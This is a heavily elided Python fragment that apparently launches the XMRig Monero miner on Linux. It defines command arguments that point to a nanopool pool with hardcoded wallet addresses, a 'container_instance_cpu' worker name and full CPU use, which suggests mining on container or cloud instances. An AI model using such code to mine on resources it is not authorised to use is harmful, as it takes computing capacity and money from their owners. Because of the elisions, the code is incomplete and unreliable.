...
if operate_system == 'lin':
    ...
    try:
        ...
        pass
import psutil
#command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf.container_instance_cpu -p nql --tls --cpu-max-threads-hint=100 -t %s' %cores
command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 88e2EcQKBMR4x5THL3VNHxQQZuZTcyEQsSGRm2qfu7kkhwrMyD5E5Ancgns9vcgPyP825srEPSjrbDw3t1b3tKabV9194xx.container_instance_cpu -p nql --tls --cpu-max-threads-hint=100 -t %s' %cores
